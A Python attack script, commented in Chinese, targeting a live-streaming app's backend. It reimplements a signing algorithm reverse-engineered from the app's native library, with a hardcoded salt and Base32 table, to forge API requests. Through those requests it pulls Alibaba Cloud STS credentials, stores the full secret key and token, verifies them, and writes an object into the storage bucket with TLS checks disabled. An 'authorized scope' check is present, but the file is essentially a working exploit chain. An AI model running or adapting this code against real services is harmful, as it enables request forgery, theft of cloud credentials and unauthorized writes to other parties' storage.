#!/usr/bin/env python3
"""APK JNI 签名 → 上传 STS → OSS marker 写入（授权范围内）。

对齐：传承/安器·临钥.md
金标准盐表来自 kktv5_20260904 / libmagic.so em5。换站时 --salt/--b32 覆盖。

示例:
  python3 炼蛊房/apk_jni_oss_sts_probe.py extract-so --so libmagic.so --case <案卷>
  python3 炼蛊房/apk_jni_oss_sts_probe.py entrance --base https://sapi.x --tag 10005030 --user-id N --token T --case <案卷>
  python3 炼蛊房/apk_jni_oss_sts_probe.py sts --base https://sapi.x --user-id N --token T --case <案卷>
  python3 炼蛊房/apk_jni_oss_sts_probe.py write-probe --case <案卷> --insecure
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

# KK / 美秀金标准（其它站用 CLI 覆盖）
DEFAULT_SALT = "cc16be4b:346c51d"
DEFAULT_B32 = "AB56DE3C8L2WF4UVM7JRSGPQYZTXK9HN"
MARKER_PREFIX = "daaixianzun-jni-oss-"
UA = "Mozilla/5.0 大爱仙尊-apk_jni_oss_sts_probe"



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "jni_oss_sts"
    d.mkdir(parents=True, exist_ok=True)
    return d


def save(case: str, name: str, obj: Any) -> Path:
    p = case_dir(case) / name
    p.write_text(json.dumps(obj, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return p


def ensure_scope(url_or_host: str) -> str:
    host = host_of(url_or_host)
    if not host or not in_scope(host):
        raise SystemExit(f"out of scope: {url_or_host}")
    return host


def ctx(insecure: bool) -> ssl.SSLContext:
    if insecure:
        return ssl._create_unverified_context()
    return ssl.create_default_context()


def custom_b32(digest: bytes, table: str) -> str:
    """还原 libmagic.so em5 的 26 字符自定义 Base32。"""
    out: list[str] = []
    bit_offset = 0
    byte_idx = 0
    n = 0
    while n <= 25 and byte_idx < 16:
        cur = digest[byte_idx]
        nxt = digest[byte_idx + 1] if byte_idx + 1 < 16 else 0
        restored = ((cur << bit_offset) & 0xFF) >> bit_offset
        check = bit_offset - 3
        if check >= 0:
            idx = ((nxt >> (11 - bit_offset)) | (restored << check)) & 0xFF
            byte_idx += 1
            bit_offset = check
        else:
            idx = restored >> (3 - bit_offset)
            bit_offset += 5
        out.append(table[idx & 0x1F])
        n += 1
    return "".join(out)


def em5(str1: str, str2: str, salt: str, table: str) -> str:
    return custom_b32(hashlib.md5((str1 + str2 + salt).encode()).digest(), table)


def build_sv(params: dict[str, Any], salt: str, table: str) -> str:
    keys = sorted(params.keys(), key=str.lower)
    parts: list[str] = []
    last = ""
    for i, k in enumerate(keys):
        v = str(params[k])
        if i == len(keys) - 1:
            parts.append(f"{k}:")
            last = v
        else:
            parts.append(f"{k}:{v}")
    return em5("".join(parts), last, salt, table)


def http_json(url: str, insecure: bool, timeout: float = 15.0) -> tuple[int, Any, str]:
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx(insecure)) as resp:
            raw = resp.read(800_000).decode("utf-8", "replace")
            try:
                return resp.status, json.loads(raw), raw
            except json.JSONDecodeError:
                return resp.status, {"_raw": raw[:2000]}, raw
    except urllib.error.HTTPError as e:
        raw = e.read(4000).decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw), raw
        except json.JSONDecodeError:
            return e.code, {"_raw": raw[:2000]}, raw


def entrance_call(
    base: str,
    params: dict[str, Any],
    salt: str,
    table: str,
    insecure: bool,
) -> tuple[int, Any]:
    body = dict(params)
    body["sv"] = build_sv(body, salt, table)
    qs = urllib.parse.quote(json.dumps(body, separators=(",", ":")))
    url = base.rstrip("/") + "/meShow/entrance?parameter=" + qs
    return http_json(url, insecure)[:2]


def cmd_extract_so(args: argparse.Namespace) -> None:
    so = Path(args.so)
    data = so.read_bytes()
    hits: list[dict[str, Any]] = []
    # 16 可打印 + NUL + 32 字母数字（自定义表）
    i = 0
    while i < len(data) - 50:
        chunk = data[i : i + 16]
        if all(32 <= b < 127 for b in chunk) and data[i + 16] == 0:
            table = data[i + 17 : i + 49]
            if len(table) == 32 and all(48 <= b < 127 for b in table) and data[i + 49 : i + 50] in (b"\x00", b""):
                salt = chunk.decode("ascii", "replace")
                tab = table.decode("ascii", "replace")
                if len(set(tab)) >= 28:
                    hits.append({"offset": hex(i), "salt": salt, "b32": tab})
        i += 1
    # 金标准旁路：固定 KK 盐
    kk = data.find(DEFAULT_SALT.encode())
    obj = {
        "generated_at": _now(),
        "so": str(so),
        "size": len(data),
        "kk_salt_offset": hex(kk) if kk >= 0 else None,
        "candidates": hits[:20],
        "hint": "优先用 JNI ADRP 指向的 16 字节，不要用 @kK1818$ 这类旁路字符串",
    }
    out = save(args.case, "extract_so.json", obj)
    print(json.dumps({"out": str(out), "candidates": len(hits), "kk_salt": kk >= 0}, ensure_ascii=False))


def cmd_sign(args: argparse.Namespace) -> None:
    params = json.loads(args.params_json)
    sv = build_sv(params, args.salt, args.b32)
    print(json.dumps({"sv": sv, "params": params}, ensure_ascii=False))


def cmd_entrance(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    extra = json.loads(args.extra) if args.extra else {}
    params: dict[str, Any] = {
        "FuncTag": int(args.tag),
        "userId": int(args.user_id),
        "token": args.token,
        "platform": 2,
        "a": 1,
        "c": 100101,
    }
    params.update(extra)
    code, body = entrance_call(args.base, params, args.salt, args.b32, args.insecure)
    rec = {"generated_at": _now(), "status": code, "tag": args.tag, "body": body}
    out = save(args.case, f"entrance_{args.tag}.json", rec)
    print(json.dumps({"out": str(out), "status": code, "TagCode": body.get("TagCode") if isinstance(body, dict) else None}, ensure_ascii=False))


def aliyun_rpc(ak: str, sk: str, st: str, host: str, action: str, version: str, extra: dict[str, str] | None = None) -> tuple[int, Any]:
    def enc(s: str) -> str:
        return urllib.parse.quote(str(s), safe="-_.~")

    params = {
        "Format": "JSON",
        "Version": version,
        "AccessKeyId": ak,
        "SignatureMethod": "HMAC-SHA1",
        "Timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "SignatureVersion": "1.0",
        "SignatureNonce": str(int(time.time() * 1000000)),
        "Action": action,
        "SecurityToken": st,
    }
    if extra:
        params.update(extra)
    keys = sorted(params)
    canonical = "&".join(f"{enc(k)}={enc(params[k])}" for k in keys)
    string_to_sign = "GET&%2F&" + enc(canonical)
    sig = base64.b64encode(hmac.new((sk + "&").encode(), string_to_sign.encode(), hashlib.sha1).digest()).decode()
    params["Signature"] = sig
    url = f"https://{host}/?{urllib.parse.urlencode(params)}"
    return http_json(url, insecure=True)


def cmd_sts(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    extra = {
        "mimeType": 2,
        "resumeUp": 1,
        "resType": 1,
        "suffix": ".jpg",
        "abroad": 1,
    }
    params: dict[str, Any] = {
        "FuncTag": 52080101,
        "userId": int(args.user_id),
        "token": args.token,
        "platform": 2,
        "a": 1,
        "c": 100101,
    }
    params.update(extra)
    code, body = entrance_call(args.base, params, args.salt, args.b32, args.insecure)
    cfg = body.get("config", body) if isinstance(body, dict) else {}
    ak = cfg.get("accessKeyID") or ""
    sk = cfg.get("accessKeySecret") or ""
    st = cfg.get("upToken") or cfg.get("securityToken") or ""
    ident: Any = None
    if ak and sk and st:
        _, ident = aliyun_rpc(ak, sk, st, "sts.aliyuncs.com", "GetCallerIdentity", "2015-04-01")
    rec = {
        "generated_at": _now(),
        "status": code,
        "TagCode": body.get("TagCode") if isinstance(body, dict) else None,
        "bucket": cfg.get("bucket"),
        "domain": cfg.get("domain"),
        "fileUrl": cfg.get("fileUrl"),
        "accessKeyID": ak,
        "accessKeySecret": sk,
        "upToken": st,
        "identity": ident,
        "note": "STS 角色含 oss 且 ECS 403 时停在对象存储，不要当云主机接管",
    }
    out = save(args.case, "sts_creds.json", rec)
    print(json.dumps({
        "out": str(out),
        "TagCode": rec["TagCode"],
        "bucket": rec["bucket"],
        "ak": ak[:16] + "…" if ak else "",
        "arn": (ident or {}).get("Arn") if isinstance(ident, dict) else None,
    }, ensure_ascii=False))


def oss_put(ak: str, sk: str, st: str, bucket: str, region: str, key: str, data: bytes, insecure: bool) -> tuple[int, str]:
    date = datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    ctype = "text/plain"
    can_h = f"x-oss-security-token:{st}\n"
    can_r = f"/{bucket}/{key}"
    sts = f"PUT\n\n{ctype}\n{date}\n{can_h}{can_r}"
    sig = base64.b64encode(hmac.new(sk.encode(), sts.encode(), hashlib.sha1).digest()).decode()
    url = f"https://{bucket}.{region}.aliyuncs.com/{key}"
    req = urllib.request.Request(url, data=data, method="PUT")
    req.add_header("Date", date)
    req.add_header("Content-Type", ctype)
    req.add_header("Authorization", f"OSS {ak}:{sig}")
    req.add_header("x-oss-security-token", st)
    req.add_header("Content-Length", str(len(data)))
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx(insecure)) as resp:
            return resp.status, resp.headers.get("ETag", "")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")


def cmd_write_probe(args: argparse.Namespace) -> None:
    creds_path = Path(args.creds_file) if args.creds_file else case_dir(args.case) / "sts_creds.json"
    creds = json.loads(creds_path.read_text(encoding="utf-8"))
    ak = creds.get("accessKeyID") or ""
    sk = creds.get("accessKeySecret") or ""
    st = creds.get("upToken") or creds.get("securityToken") or ""
    bucket = args.bucket or creds.get("bucket") or ""
    if not (ak and sk and st and bucket):
        raise SystemExit("missing STS fields; run sts first")
    key = f"{MARKER_PREFIX}{_now().replace(':', '')}.txt"
    payload = b"DAAIXIANZUN_JNI_OSS_STS_MARKER\n"
    code, etag = oss_put(ak, sk, st, bucket, args.region, key, payload, args.insecure)
    rec = {
        "generated_at": _now(),
        "bucket": bucket,
        "key": key,
        "status": code,
        "etag": etag,
        "level": "L3" if code == 200 else "fail",
    }
    out = save(args.case, "write_probe.json", rec)
    print(json.dumps({"out": str(out), **rec}, ensure_ascii=False))


def main() -> None:
    ap = argparse.ArgumentParser(description="APK JNI sign → OSS STS probe")
    ap.add_argument("--case", required=True)
    ap.add_argument("--salt", default=DEFAULT_SALT)
    ap.add_argument("--b32", default=DEFAULT_B32)
    ap.add_argument("--insecure", action="store_true")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("extract-so")
    p.add_argument("--so", required=True)

    p = sub.add_parser("sign")
    p.add_argument("--params-json", required=True)

    p = sub.add_parser("entrance")
    p.add_argument("--base", required=True)
    p.add_argument("--tag", required=True)
    p.add_argument("--user-id", required=True)
    p.add_argument("--token", required=True)
    p.add_argument("--extra", default="")

    p = sub.add_parser("sts")
    p.add_argument("--base", required=True)
    p.add_argument("--user-id", required=True)
    p.add_argument("--token", required=True)

    p = sub.add_parser("write-probe")
    p.add_argument("--creds-file", default="")
    p.add_argument("--bucket", default="")
    p.add_argument("--region", default="oss-cn-hangzhou")

    args = ap.parse_args()
    if args.cmd == "extract-so":
        cmd_extract_so(args)
    elif args.cmd == "sign":
        cmd_sign(args)
    elif args.cmd == "entrance":
        cmd_entrance(args)
    elif args.cmd == "sts":
        cmd_sts(args)
    elif args.cmd == "write-probe":
        cmd_write_probe(args)


if __name__ == "__main__":
    main()
